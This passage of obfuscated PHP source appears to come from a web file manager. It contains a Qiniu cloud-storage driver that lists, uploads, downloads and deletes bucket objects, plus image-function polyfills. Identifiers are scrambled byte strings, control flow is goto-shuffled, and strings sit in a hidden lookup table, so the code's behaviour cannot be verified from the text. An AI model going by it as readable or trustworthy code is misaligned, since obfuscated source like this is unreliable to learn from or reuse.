intval($Cà©‹è¤‹¹[$a‡Üáïğ¶[1186]]); } return $Cà©‹è¤‹¹; } protected function _isFolder($FÏÜ¼ñŒ…ã) { $bÜÜ¨Áã„Ô =& $_SERVER[Õİõş]; if ($FÏÜ¼ñŒ…ã == $bÜÜ¨Áã„Ô[33] || $FÏÜ¼ñŒ…ã == $bÜÜ¨Áã„Ô[8]) { return !0; } $cëÇâ¬¨Ê = array($bÜÜ¨Áã„Ô[1176] => $bÜÜ¨Áã„Ô[8], $bÜÜ¨Áã„Ô[182] => rtrim($FÏÜ¼ñŒ…ã, $bÜÜ¨Áã„Ô[8]) . $bÜÜ¨Áã„Ô[8], $bÜÜ¨Áã„Ô[1177] => 1, $bÜÜ¨Áã„Ô[1178] => $bÜÜ¨Áã„Ô[33]); $AØä¾àÛ¼… = $this->client->listObjects($this->bucket, $cëÇâ¬¨Ê); if ($AØä¾àÛ¼…->getObjectList() || $AØä¾àÛ¼…->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($E¶ÛëİàÄ‡) { parent::__construct(); require_once SDK_DIR . $_SERVER[Õİõş][1207]; $this->_init($E¶ÛëİàÄ‡); } public function _init($bà‘Å‚¦Í) { foreach ($bà‘Å‚¦Í as $B¨‚Ò¡ä×Ù => $eÖ„Ñˆé¡ù) { if (isset($this->{$B¨‚Ò¡ä×Ù})) { $this->{$B¨‚Ò¡ä×Ù} = $eÖ„Ñˆé¡ù; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Õİõş][1208], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($aÛåèÖÁÒ, $F“×‘ÃÙ›‡ = '', $d†á®‰š‰ = REPEAT_RENAME) { if ($this->setContent($aÛåèÖÁÒ, $F“×‘ÃÙ›‡)) { return $this->getPathOuter($aÛåèÖÁÒ); } return !1; } public function mkdir($Dœ«ˆ™®œÕ, $EØçšùÓà¤ = REPEAT_SKIP) { goto F‘óÚšÉÚ‡; F‘óÚšÉÚ‡: $B——à²¯Àæ =& $_SERVER[Õİõş]; $aïÏÒÔÉƒ = trim($Dœ«ˆ™®œÕ, $B——à²¯Àæ[8]); if ($this->_isFolder($aïÏÒÔÉƒ)) { return $this->getPathOuter($aïÏÒÔÉƒ); } goto E¸Ø¬Öà•; E¸Ø¬Öà•: $Dœ«ˆ™®œÕ = $aïÏÒÔÉƒ . $B——à²¯Àæ[8]; $a·ôªàôø = get_path_this($aïÏÒÔÉƒ); $a¶æ‚°¥“ = $Dœ«ˆ™®œÕ . $a·ôªàôø; goto D¬¾ñÈÍº¤; D¬¾ñÈÍº¤: if (!$this->mkfile($a¶æ‚°¥“)) { return !1; } if (!$this->moveFile($a¶æ‚°¥“, $Dœ«ˆ™®œÕ)) { $this->delFile($a¶æ‚°¥“); return !1; } return $this->getPathOuter($aïÏÒÔÉƒ); goto dÑÎ¾ÍÎßõ; dÑÎ¾ÍÎßõ: } public function copyFile($f°öô˜šäÈ, $a°ß±¥¿Ø‘) { $Aó”İòäŸ = $this->bucketManager->copy($this->bucket, $f°öô˜šäÈ, $this->bucket, $a°ß±¥¿Ø‘, !0); return $Aó”İòäŸ ? !1 : !0; } public function moveFile($a¦ÓŸí‚óº, $A Ã÷ØğÜ) { $AĞ¼–¦±„ = $this->bucketManager->move($this->bucket, $a¦ÓŸí‚óº, $this->bucket, $A Ã÷ØğÜ, !0); return $AĞ¼–¦±„ ? !1 : !0; } public function delFile($d‘†«¿‘¯) { $aøÊ‘è = $this->bucketManager->delete($this->bucket, $d‘†«¿‘¯); return $aøÊ‘è ? !1 : !0; } public function delFolder($b¤æÜÑ¢¬­) { $EÛ‚ƒ³±ÅÑ = $this->fileList($b¤æÜÑ¢¬­); if (empty($EÛ‚ƒ³±ÅÑ)) { return !0; } $e™õš§ÙÃ­ = 1000; if (count($EÛ‚ƒ³±ÅÑ) <= $e™õš§ÙÃ­) { return $this->qnDelObj($EÛ‚ƒ³±ÅÑ) ? !1 : !0; } foreach (array_chunk($EÛ‚ƒ³±ÅÑ, $e™õš§ÙÃ­) as $f“¯Ô§Î½) { $E†‰Áæ—áØ = $this->qnDelObj($f“¯Ô§Î½); if ($E†‰Áæ—áØ) { return !1; } } return !0; } private function qnDelObj($Dë±ñ“‘) { $aé±ä•àé = $this->bucketManager->buildBatchDelete($this->bucket, $Dë±ñ“‘); list($E­ÔÕ¡±Ï, $aØÓ‘„È©¾) = $this->bucketManager->batch($aé±ä•àé); return $aØÓ‘„È©¾; } private function fileList($a¯§£•·ãö, $F½×¯Ú = 0) { goto aÎ½ì‹çäî; eõµ‘™¶ŞÏ: $E·ï‚ ”‡ = $B‚İ†×‚Í[33]; $A¹øÑÙíÔá = 1000; $eÖºç©‘¢— = $B‚İ†×‚Í[33]; goto Bö§Øç‰È; aÎ½ì‹çäî: $B‚İ†×‚Í =& $_SERVER[Õİõş]; $a¯§£•·ãö = trim($a¯§£•·ãö, $B‚İ†×‚Í[8]); $cÚæÃØ‰Ò¤ = empty($a¯§£•·ãö) ? $B‚İ†×‚Í[33] : $a¯§£•·ãö . $B‚İ†×‚Í[8]; goto eõµ‘™¶ŞÏ; Bö§Øç‰È: $Fâ•–ó‰¤ = array(); while (!0) { list($e¸ŠÛÀæ, $E¶ëÛæÌËâ) = $this->bucketManager->listFiles($this->bucket, $cÚæÃØ‰Ò¤, $E·ï‚ ”‡, $A¹øÑÙíÔá, $eÖºç©‘¢—); if ($E¶ëÛæÌËâ) { return !1; } $E·ï‚ ”‡ = array_key_exists($B‚İ†×‚Í[1178], $e¸ŠÛÀæ) ? $E·ï‚ ”‡ = $e¸ŠÛÀæ[$B‚İ†×‚Í[1209]] : $B‚İ†×‚Í[33]; foreach ($e¸ŠÛÀæ[$B‚İ†×‚Í[1210]] as $AİÂ‹¼¡Õ) { $eç£í‹ÚÇÑ = $AİÂ‹¼¡Õ[$B‚İ†×‚Í[89]]; if ($F½×¯Ú) { $eç£í‹ÚÇÑ = array($B‚İ†×‚Í[28] => $eç£í‹ÚÇÑ, $B‚İ†×‚Í[77] => $AİÂ‹¼¡Õ[$B‚İ†×‚Í[1211]]); } $Fâ•–ó‰¤[] = $eç£í‹ÚÇÑ; } if ($E·ï‚ ”‡ == $B‚İ†×‚Í[33]) { break; } } return $Fâ•–ó‰¤; goto F¢×Ü’ïã; F¢×Ü’ïã: } public function rename($bˆİ¨¢¬ñ…, $Bƒ‹‚½‘ò) { return $this->renameObject($bˆİ¨¢¬ñ…, $Bƒ‹‚½‘ò); } public function fileInfo($d´†èÚ´è, $f´ÎÇôĞÚ² = false, $D±Ù¥‘¾Ï˜ = array()) { goto b†ñ‰ İİÏ; AñöÕñ˜™Î: if (empty($D±Ù¥‘¾Ï˜)) { $D±Ù¥‘¾Ï˜ = $this->objectMeta($d´†èÚ´è); if (!$D±Ù¥‘¾Ï˜) { return $E†ã“÷Ì °; } } if (isset($D±Ù¥‘¾Ï˜[$E‹É­áÚäæ[1212]])) { $E†ã“÷Ì °[$E‹É­áÚäæ[183]] = $D±Ù¥‘¾Ï˜[$E‹É­áÚäæ[1212]]; } if (isset($D±Ù¥‘¾Ï˜[$E‹É­áÚäæ[1211]])) { $E†ã“÷Ì °[$E‹É­áÚäæ[77]] = $D±Ù¥‘¾Ï˜[$E‹É­áÚäæ[1211]]; } goto CŒÇÉ‘ÂÖë; CŒÇÉ‘ÂÖë: return $E†ã“÷Ì °; goto aÔœæ¸ãìÊ; b†ñ‰ İİÏ: $E‹É­áÚäæ =& $_SERVER[Õİõş]; if ($f´ÎÇôĞÚ²) { return array($E‹É­áÚäæ[28] => $this->pathThis($d´†èÚ´è), $E‹É­áÚäæ[75] => $this->getPathOuter($E‹É­áÚäæ[8] . $d´†èÚ´è), $E‹É­áÚäæ[29] => $E‹É­áÚäæ[163], $E‹É­áÚäæ[77] => isset($D±Ù¥‘¾Ï˜[$E‹É­áÚäæ[1211]]) ? $D±Ù¥‘¾Ï˜[$E‹É­áÚäæ[1211]] : 0, $E‹É­áÚäæ[156] => $this->ext($d´†èÚ´è)); } $E†ã“÷Ì ° = array($E‹É­áÚäæ[28] => $this->pathThis($d´†èÚ´è), $E‹É­áÚäæ[75] => $this->getPathOuter($E‹É­áÚäæ[8] . $d´†èÚ´è), $E‹É­áÚäæ[29] => $E‹É­áÚäæ[163], $E‹É­áÚäæ[183] => 0, $E‹É­áÚäæ[106] => 0, $E‹É­áÚäæ[77] => 0, $E‹É­áÚäæ[156] => $this->ext($d´†èÚ´è), $E‹É­áÚäæ[184] => !0, $E‹É­áÚäæ[185] => !0); goto AñöÕñ˜™Î; aÔœæ¸ãìÊ: } public function folderInfo($BÜ…éôŸ„‘, $A¦ºôëó´É = false) { goto c‡ô¦›Îƒß; c‡ô¦›Îƒß: $CÑÑŠ¾Ä†ù =& $_SERVER[Õİõş]; if ($A¦ºôëó´É) { return array($CÑÑŠ¾Ä†ù[28] => $this->pathThis($BÜ…éôŸ„‘), $CÑÑŠ¾Ä†ù[75] => $this->getPathOuter($CÑÑŠ¾Ä†ù[8] . $BÜ…éôŸ„‘), $CÑÑŠ¾Ä†ù[29] => $CÑÑŠ¾Ä†ù[76]); } $B‡ë‘ÜŞŒİ = array($CÑÑŠ¾Ä†ù[28] => $this->pathThis($BÜ…éôŸ„‘), $CÑÑŠ¾Ä†ù[75] => $this->getPathOuter($CÑÑŠ¾Ä†ù[8] . $BÜ…éôŸ„‘), $CÑÑŠ¾Ä†ù[29] => $CÑÑŠ¾Ä†ù[76], $CÑÑŠ¾Ä†ù[183] => 0, $CÑÑŠ¾Ä†ù[106] => 0, $CÑÑŠ¾Ä†ù[1157] => !0, $CÑÑŠ¾Ä†ù[1158] => !0); goto DÂŠÍŠ¾; DÂŠÍŠ¾: $BÜ…éôŸ„‘ = rtrim($BÜ…éôŸ„‘, $CÑÑŠ¾Ä†ù[8]) . $CÑÑŠ¾Ä†ù[8]; $cÍ¨ÄËùì¯ = $this->objectMeta($BÜ…éôŸ„‘); if (isset($cÍ¨ÄËùì¯[$CÑÑŠ¾Ä†ù[1212]])) { $B‡ë‘ÜŞŒİ[$CÑÑŠ¾Ä†ù[183]] = $cÍ¨ÄËùì¯[$CÑÑŠ¾Ä†ù[1212]]; } goto bºÒ»©éöµ; bºÒ»©éöµ: return $B‡ë‘ÜŞŒİ; goto BÙéÑ‹°°; BÙéÑ‹°°: } public function listPath($BèÛ·Óª, $A£·éîğ÷ = false) { goto DÖ’¤®Â‘; DÖ’¤®Â‘: $fàÕÒÃºÃ =& $_SERVER[Õİõş]; $BèÛ·Óª = trim($BèÛ·Óª, $fàÕÒÃºÃ[8]); $bÏ–§‰ã¬¼ = empty($BèÛ·Óª) ? $fàÕÒÃºÃ[33] : $BèÛ·Óª . $fàÕÒÃºÃ[8]; goto fº½”ìµŒº; aãÙñÑ‘Ô›: $AçÛíÀ¶Ô— = $FœØœ‚Ñƒ = array(); while (!0) { list($D»ëÂÔĞ”, $C£¡ªö¤ŞÊ) = $this->bucketManager->listFiles($this->bucket, $bÏ–§‰ã¬¼, $Aã¥©½ß, $Fó‰Î¥‘ƒ°, $bœÇê£ë’Í); if ($C£¡ªö¤ŞÊ) { return !1; } $Aã¥©½ß = array_key_exists($fàÕÒÃºÃ[1178], $D»ëÂÔĞ”) ? $Aã¥©½ß = $D»ëÂÔĞ”[$fàÕÒÃºÃ[1209]] : $fàÕÒÃºÃ[33]; if (isset($D»ëÂÔĞ”[$fàÕÒÃºÃ[1213]])) { foreach ($D»ëÂÔĞ”[$fàÕÒÃºÃ[1213]] as $a·õ¹ãî…ê) { if ($a·õ¹ãî…ê == $bÏ–§‰ã¬¼) { continue; } $AçÛíÀ¶Ô—[] = $this->folderInfo($a·õ¹ãî…ê, $A£·éîğ÷); } } if (isset($D»ëÂÔĞ”[$fàÕÒÃºÃ[1210]])) { foreach ($D»ëÂÔĞ”[$fàÕÒÃºÃ[1210]] as $AÕµÁÚ¢Ìï) { if ($AÕµÁÚ¢Ìï[$fàÕÒÃºÃ[89]] == $bÏ–§‰ã¬¼) { continue; } $FœØœ‚Ñƒ[] = $this->fileInfo($AÕµÁÚ¢Ìï[$fàÕÒÃºÃ[89]], $A£·éîğ÷, $AÕµÁÚ¢Ìï); } } if ($Aã¥©½ß == $fàÕÒÃºÃ[33]) { break; } } return array($fàÕÒÃºÃ[74] => $AçÛíÀ¶Ô—, $fàÕÒÃºÃ[73] => $FœØœ‚Ñƒ); goto b¸ß¶ğêˆª; fº½”ìµŒº: $Aã¥©½ß = $fàÕÒÃºÃ[33]; $Fó‰Î¥‘ƒ° = 1000; $bœÇê£ë’Í = $fàÕÒÃºÃ[8]; goto aãÙñÑ‘Ô›; b¸ß¶ğêˆª: } public function has($cŠÊ¥çæ¤ª, $b¢«Ø’ÆÈ = false, $a‰¹‘ğùï = true) { goto Fô…œÛ£İ; e…±Æø¶âª: $A”ÂÎÚ¢´ø = $f†ìÖ†ÏõŒ[33]; $D…•¼í¡‡ = 1000; $DÓãæ†á÷ = $f†ìÖ†ÏõŒ[8]; goto cÖäÜ¨Ş¸ˆ; Aùãª©“Û : if ($b¢«Ø’ÆÈ) { return array($f†ìÖ†ÏõŒ[187] => $d„Î›êÙñé, $f†ìÖ†ÏõŒ[188] => $e›Óİæ¯¢Ò); } return !1; goto f·Í¶Œø×; Fô…œÛ£İ: $f†ìÖ†ÏõŒ =& $_SERVER[Õİõş]; $cŠÊ¥çæ¤ª = trim($cŠÊ¥çæ¤ª, $f†ìÖ†ÏõŒ[8]); $FĞğÑö‡‘¢ = empty($cŠÊ¥çæ¤ª) ? $f†ìÖ†ÏõŒ[33] : $cŠÊ¥çæ¤ª . $f†ìÖ†ÏõŒ[8]; goto e…±Æø¶âª; cÖäÜ¨Ş¸ˆ: $d„Î›êÙñé = 0; $e›Óİæ¯¢Ò = 0; while (!0) { list($C¤Æ‰¤•¸™, $B©‚‚Ê®¯) = $this->bucketManager->listFiles($this->bucket, $FĞğÑö‡‘¢, $A”ÂÎÚ¢´ø, $D…•¼í¡‡, $DÓãæ†á÷); if ($B©‚‚Ê®¯) { return !1; } $A”ÂÎÚ¢´ø = array_key_exists($f†ìÖ†ÏõŒ[1178], $C¤Æ‰¤•¸™) ? $A”ÂÎÚ¢´ø = $C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1209]] : $f†ìÖ†ÏõŒ[33]; if ($b¢«Ø’ÆÈ) { if (!empty($C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1210]])) { $d„Î›êÙñé += count($C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1210]]); } if (!empty($C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1213]])) { $e›Óİæ¯¢Ò += count($C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1213]]); } if ($A”ÂÎÚ¢´ø === $f†ìÖ†ÏõŒ[33]) { break; } continue; } if ($a‰¹‘ğùï) { if (!empty($C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1210]])) { return !0; } } else { if (!empty($C¤Æ‰¤•¸™[$f†ìÖ†ÏõŒ[1213]])) { return !0; } } if ($A”ÂÎÚ¢´ø == $f†ìÖ†ÏõŒ[33]) { break; } } goto Aùãª©“Û ; f·Í¶Œø×: } public function listAll($bˆ ’ØÕ›) { $DÔÑÚ—ÈÇ =& $_SERVER[Õİõş]; $eÍ¢•¨áà = $this->fileList($bˆ ’ØÕ›, 1); $C•ÍÄ¬òäí = array(); foreach ($eÍ¢•¨áà as $F£•“œ°½ï) { $C•ÍÄ¬òäí[$F£•“œ°½ï[$DÔÑÚ—ÈÇ[28]]] = $F£•“œ°½ï[$DÔÑÚ—ÈÇ[77]]; } return $this->listAllFiles($bˆ ’ØÕ›, array_keys($C•ÍÄ¬òäí), $C•ÍÄ¬òäí); } public function canRead($c‹ãƒĞ»ÓÇ) { return $this->exist($c‹ãƒĞ»ÓÇ) ? !0 : !1; } public function canWrite($a·ïë•¥¹Ô) { return $this->exist($a·ïë•¥¹Ô) ? !0 : !1; } public function getContent($fãš¯îÃ±) { return $this->fileSubstr($fãš¯îÃ±, 0, -1); } public function setContent($EáèÁë÷‚ç, $a­ì‰ÄëÖ = '') { $bçŞï¾›¦ = $this->tempFile($this->pathThis($EáèÁë÷‚ç)); file_put_contents($bçŞï¾›¦, $a­ì‰ÄëÖ); if ($this->upload($EáèÁë÷‚ç, $bçŞï¾›¦)) { $this->tempFileRemve($bçŞï¾›¦); return !0; } return !1; } public function refreshUrls($EİÀÏ¡µÓö) { goto d‚Ø‚¬í¾Ú; d‚Ø‚¬í¾Ú: $Cî½ìÁÒöó =& $_SERVER[Õİõş]; $D‚¾¨ã± = array(); if (is_array($EİÀÏ¡µÓö)) { foreach ($EİÀÏ¡µÓö as $aÉÎÕ™Ø§à) { $D‚¾¨ã±[] = $this->link($aÉÎÕ™Ø§à); } } else { $D‚¾¨ã±[] = $this->link($EİÀÏ¡µÓö); } goto eÀ–‡ ¯Æ³; eÀ–‡ ¯Æ³: $BÂè¤„õŠ = new Qiniu\Cdn\CdnManager($this->auth); list($B±Íö¦ì ˜, $f¶á„˜ÌŸ‹) = $BÂè¤„õŠ->refreshUrls($D‚¾¨ã±); if ($f¶á„˜ÌŸ‹) { return !1; } goto eğë˜ÛÀ³Ö; eğë˜ÛÀ³Ö: return $B±Íö¦ì ˜[$Cî½ìÁÒöó[1214]] == $Cî½ìÁÒöó[698] ? !0 : !1; goto Dº¬§×µ°¥; Dº¬§×µ°¥: } public function fileSubstr($DÃó•¡­«, $fƒ–÷Â Š, $dÑ»¹è¶İä) { $F‘Ù¯ÖÜÑ¹ =& $_SERVER[Õİõş]; if (!($AÊÕ’Ç¸Ø = $this->link($DÃó•¡­«))) { return !1; } $D¨èÉ°è† = !1; if ($dÑ»¹è¶İä > 0) { $b½é¾ëŠ™” = $fƒ–÷Â Š + $dÑ»¹è¶İä - 1; $D¨èÉ°è† = array($F‘Ù¯ÖÜÑ¹[1215] . $fƒ–÷Â Š . $F‘Ù¯ÖÜÑ¹[407] . $b½é¾ëŠ™”); } $bÅ­çğìó = url_request($AÊÕ’Ç¸Ø, $F‘Ù¯ÖÜÑ¹[212], !1, $D¨èÉ°è†); return $bÅ­çğìó[$F‘Ù¯ÖÜÑ¹[691]] ? $bÅ­çğìó[$F‘Ù¯ÖÜÑ¹[1037]] : !1; } public function upload($A­„Ä­íƒ, $b•†á…ä×, $FÓ¢œ„¸† = false, $e…ë­«Á•° = REPEAT_REPLACE) { $CÀ‘³ŒËÔŞ = new Qiniu\Storage\UploadManager(); $eò÷Á¨øÑ = $this->auth->uploadToken($this->bucket, $A­„Ä­íƒ); $dğà×†£ã… = get_file_mime(get_path_ext($b•†á…ä×)); list($aßÀ¬ÏÕ‰‡, $cÚ¸ƒ­‚ùâ) = $CÀ‘³ŒËÔŞ->putFile($eò÷Á¨øÑ, $A­„Ä­íƒ, $b•†á…ä×, null, $dğà×†£ã…); return $cÚ¸ƒ­‚ùâ ? !1 : $this->getPathOuter($A­„Ä­íƒ); } public function uploadFormData($Eˆ—¯ñùÀ , $B‚ÈÊÈŠë = 3600) { return $this->uploadToken($Eˆ—¯ñùÀ , $B‚ÈÊÈŠë); } public function multiUploadFormData($bÏ‚×›», $FÀ¢¤ãÜ¿ = 3600) { return $this->uploadToken($bÏ‚×›», $FÀ¢¤ãÜ¿); } private function uploadToken($dö‰µ©ÒÒ, $F¥ŒõÇƒé = 3600) { goto D·”ÍÌŞÂˆ; b‰ºó««À´: $F±ÔŞ‚³Ä½ = null; $fŸªâäŞŸÖ = $this->auth->uploadToken($this->bucket, $F±ÔŞ‚³Ä½, $eš§¼”Ç±¥, $a†¤ô¢–Š‘, !0); $Bç¾¹´†Ø˜ = empty($this->region) || $this->region == $D”˜¿ËŒÊ[1218] ? $D”˜¿ËŒÊ[33] : $D”˜¿ËŒÊ[407] . $this->region; goto f–ÌĞ¢Ø«†; f–ÌĞ¢Ø«†: $Cµ”¾öÄù™ = http_type() . "\x3a\x2f\x2f\x75\160\x6c\157\141\x64{$Bç¾¹´†Ø˜}\56\161\x69\x6e\x69\165\160\x2e\x63\x6f\x6d\x2f"; return array($D”˜¿ËŒÊ[1219] => $fŸªâäŞŸÖ, $D”˜¿ËŒÊ[1220] => $Cµ”¾öÄù™); goto c†¡´Î°Ğ×; D·”ÍÌŞÂˆ: $D”˜¿ËŒÊ =& $_SERVER[Õİõş]; $eš§¼”Ç±¥ = $F¥ŒõÇƒé; $a†¤ô¢–Š‘ = array($D”˜¿ËŒÊ[1216] => $D”˜¿ËŒÊ[1217]); goto b‰ºó««À´; c†¡´Î°Ğ×: } public function download($B«²¸Ì½¦, $fŸ³ÃÂ¦·) { goto FÕŸŒ¾»Ÿ; B¹¦·¦¢¨: $EˆÉóª¶ = 1024 * 200; $c¹ŠœéÂ¥‰ = fopen($a¿Üƒ¦˜³, $_SERVER[Õİõş][1221]); while (!0) { $f¹í¿î®‡ñ = $this->fileSubstr($B«²¸Ì½¦, $Dà…‚Ú»®±, $EˆÉóª¶); if ($f¹í¿î®‡ñ === !1) { return !1; } fwrite($c¹ŠœéÂ¥‰, $f¹í¿î®‡ñ); $Dà…‚Ú»®± += $EˆÉóª¶; if (strlen($f¹í¿î®‡ñ) < $EˆÉóª¶) { break; } } goto AˆÓãÛ¥®Œ; FÕŸŒ¾»Ÿ: $a¿Üƒ¦˜³ = IO::getPathInner(IO::mkfile($fŸ³ÃÂ¦·)); if (!($D›É¾òö‘Ñ = $this->link($B«²¸Ì½¦))) { return !1; } $Dà…‚Ú»®± = 0; goto B¹¦·¦¢¨; AˆÓãÛ¥®Œ: fclose($c¹ŠœéÂ¥‰); return $fŸ³ÃÂ¦·; goto E½¥¸ïêù; E½¥¸ïêù: } public function link($Bòß‰½Ò, $eÜÙöÑÂÎô = '') { if (!$this->isFile($Bòß‰½Ò)) { return !1; } $Dˆ‡ÍÛ­› = $this->getHost() . $_SERVER[Õİõş][8] . $this->pathEncode($Bòß‰½Ò) . $eÜÙöÑÂÎô; return $this->auth->privateDownloadUrl($Dˆ‡ÍÛ­›, 3600 * 12); } public function fileOut($DêõŠ¼Ù”, $D’Èé‘‰ÀÏ = false, $c¾˜‡††¼ = false, $A”‘·°››Ê = '') { $FÄ‘¬óÒïÏ =& $_SERVER[Õİõş]; if (!$c¾˜‡††¼) { $c¾˜‡††¼ = $this->pathThis($DêõŠ¼Ù”); } $DŸİîèÜÑÏ = $D’Èé‘‰ÀÏ ? $FÄ‘¬óÒïÏ[1222] . rawurlencode($c¾˜‡††¼) : $FÄ‘¬óÒïÏ[33]; $A·Š°´é = $this->link($DêõŠ¼Ù”, $DŸİîèÜÑÏ); $this->fileOutLink($A·Š°´é); } public function fileOutServer($FÌùÁ¶—, $BÙ®åÈµ–ğ = false, $aéùÜ×ÕÄÜ = false, $AŒ”çŸ®¥œ = '') { parent::fileOut($FÌùÁ¶—, $BÙ®åÈµ–ğ, $aéùÜ×ÕÄÜ, $AŒ”çŸ®¥œ); } public function fileOutImage($C±‹‰‹‹§À, $Dç¨»íÉö¤ = 250) { $D›­¾ÃÔªÎ = $this->link($C±‹‰‹‹§À, $_SERVER[Õİõş][1223] . $Dç¨»íÉö¤); $this->fileOutLink($D›­¾ÃÔªÎ); } public function fileOutImageServer($EÌÌÃÇÀ, $e‘Ê¢™º¡ = 250) { parent::fileOutImage($EÌÌÃÇÀ, $e‘Ê¢™º¡); } public function hashMd5($EòÖÄ½áÓ×) { $fŒÈÃ÷Ìšó =& $_SERVER[Õİõş]; $C†ÆŞºæÅ± = $this->objectMeta($EòÖÄ½áÓ×); return isset($C†ÆŞºæÅ±[$fŒÈÃ÷Ìšó[192]]) ? $C†ÆŞºæÅ±[$fŒÈÃ÷Ìšó[192]] : !1; $c×íÑÜ¨”  = $this->link($EòÖÄ½áÓ×, $fŒÈÃ÷Ìšó[1224]); } public function size($bØƒ®¼ª•) { $D™ßÏÃ§×² = $this->objectMeta($bØƒ®¼ª•); return $D™ßÏÃ§×² ? $D™ßÏÃ§×²[$_SERVER[Õİõş][77]] : 0; } public function info($F”ƒ‚Ñ‡†) { if ($this->isFolder($F”ƒ‚Ñ‡†)) { return $this->folderInfo($F”ƒ‚Ñ‡†); } else { if ($this->isFile($F”ƒ‚Ñ‡†)) { return $this->fileInfo($F”ƒ‚Ñ‡†); } } return !1; } public function exist($E‡”±·àÈ) { return $this->isFile($E‡”±·àÈ) || $this->isFolder($E‡”±·àÈ); } public function isFile($eòÅïöå’Ÿ) { return !$this->isFolder($eòÅïöå’Ÿ) && $this->objectMeta($eòÅïöå’Ÿ); } public function isFolder($a¢ğëä³) { return $this->cacheMethod($_SERVER[Õİõş][219], $a¢ğëä³); } protected function objectMeta($BÒßÚÒÃµ) { return $this->cacheMethod($_SERVER[Õİõş][220], $BÒßÚÒÃµ); } protected function _objectMeta($CÄÜ»Ñò±Ë) { $B¾ì¦Å¬ç =& $_SERVER[Õİõş]; list($e©ù—È­©, $C‹˜ã²‘ôå) = $this->bucketManager->stat($this->bucket, $CÄÜ»Ñò±Ë); if ($e©ù—È­©) { $e©ù—È­©[$B¾ì¦Å¬ç[77]] = intval($e©ù—È­©[$B¾ì¦Å¬ç[1211]]); } return $e©ù—È­©; } protected function _isFolder($a‡ïÊÂç ) { $Eì‚©ŒÅ =& $_SERVER[Õİõş]; list($Aä×ŞÛñŠä, $bĞÑï¹ãæÄ) = $this->bucketManager->listFiles($this->bucket, trim($a‡ïÊÂç , $Eì‚©ŒÅ[8]) . $Eì‚©ŒÅ[8], $Eì‚©ŒÅ[33], 1, $Eì‚©ŒÅ[8]); return !empty($Aä×ŞÛñŠä[$Eì‚©ŒÅ[1210]]) || !empty($Aä×ŞÛñŠä[$Eì‚©ŒÅ[1213]]) ? !0 : !1; } } goto BŠİ¿§¯ —; a¸½ÂÌªÕ½: if (!function_exists($_SERVER[Õİõş][1848])) { define($_SERVER[Õİõş][1849], 0); define($_SERVER[Õİõş][1850], 1); define($_SERVER[Õİõş][1851], 2); function imageflip($a®×èöÅÚ, $c³•ÂŸ¾³÷) { switch ($c³•ÂŸ¾³÷) { case IMG_FLIP_HORIZONTAL: $aò¾¹›ÙºŠ = imagesx($a®×èöÅÚ) - 1; $e’ ’·ùÙ¶ = $aò¾¹›ÙºŠ / 2; $cİ«È±†¤ª = imagesy($a®×èöÅÚ); $B”Ã®‘Ô¸ = imageistruecolor($a®×èöÅÚ) ? imagecreatetruecolor(1, $cİ«È±†¤ª) : imagecreate(1, $cİ«È±†¤ª); for ($Bî×Ï—í„¶ = 0; $Bî×Ï—í„¶ < $e’ ’·ùÙ¶; ++$Bî×Ï—í„¶) { imagecopy($B”Ã®‘Ô¸, $a®×èöÅÚ, 0, 0, $Bî×Ï—í„¶, 0, 1, $cİ«È±†¤ª); imagecopy($a®×èöÅÚ, $a®×èöÅÚ, $Bî×Ï—í„¶, 0, $aò¾¹›ÙºŠ - $Bî×Ï—í„¶, 0, 1, $cİ«È±†¤ª); imagecopy($a®×èöÅÚ, $B”Ã®‘Ô¸, $aò¾¹›ÙºŠ - $Bî×Ï—í„¶, 0, 0, 0, 1, $cİ«È±†¤ª); } break; case IMG_FLIP_VERTICAL: $cß¾§ñ–Ó„ = imagesx($a®×èöÅÚ); $a‚ˆ’Êƒ—§ = imagesy($a®×èöÅÚ) - 1; $e¤É—Ğ§ = $a‚ˆ’Êƒ—§ / 2; $B”Ã®‘Ô¸ = imageistruecolor($a®×èöÅÚ) ? imagecreatetruecolor($cß¾§ñ–Ó„, 1) : imagecreate($cß¾§ñ–Ó„, 1); for ($C±‡¥¢Ó£Ù = 0; $C±‡¥¢Ó£Ù < $e¤É—Ğ§; ++$C±‡¥¢Ó£Ù) { imagecopy($B”Ã®‘Ô¸, $a®×èöÅÚ, 0, 0, 0, $C±‡¥¢Ó£Ù, $cß¾§ñ–Ó„, 1); imagecopy($a®×èöÅÚ, $a®×èöÅÚ, 0, $C±‡¥¢Ó£Ù, 0, $a‚ˆ’Êƒ—§ - $C±‡¥¢Ó£Ù, $cß¾§ñ–Ó„, 1); imagecopy($a®×èöÅÚ, $B”Ã®‘Ô¸, 0, $a‚ˆ’Êƒ—§ - $C±‡¥¢Ó£Ù, 0, 0, $cß¾§ñ–Ó„, 1); } break; case IMG_FLIP_BOTH: $cß¾§ñ–Ó„ = imagesx($a®×èöÅÚ); $cİ«È±†¤ª = imagesy($a®×èöÅÚ); $B”Ã®‘Ô¸ = imagerotate($a®×èöÅÚ, 180, 0); imagecopy($a®×èöÅÚ, $B”Ã®‘Ô¸, 0, 0, 0, 0, $cß¾§ñ–Ó„, $cİ«È±†¤ª); break; default: return; } imagedestroy($B”Ã®‘Ô¸); } } if (!function_exists($_SERVER[Õİõş][1852])) { function imagecreatefrombmp($cïÚ—Šµ†ˆ) { return ImageGdBMP::load($cïÚ—Šµ†ˆ); } } class Input { public static function getArray($AÇÕá…ÑØ‹) { goto d¥çŠØô¹á; CÓ›ğÓ·Â: $dŒ»ª¡Şªö = array(); $fÓÛÑ»º = LNG($EÏÑ²¨Ëïô[1853]); foreach ($AÇÕá…ÑØ‹ as $eÚîÒœåø => 